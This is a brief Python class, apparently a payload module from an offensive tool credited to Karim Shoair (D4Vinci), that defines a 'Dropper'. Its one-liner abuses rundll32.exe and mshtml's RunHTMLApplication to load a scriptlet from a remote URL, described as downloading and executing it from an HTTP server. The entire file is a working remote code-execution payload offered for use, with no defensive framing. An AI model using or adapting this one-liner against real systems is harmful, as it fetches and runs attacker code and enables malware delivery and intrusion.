class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and execute a scriptlet file from a http server."
    function    = "Dropper"
    liner       = 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:URL");window.close();'
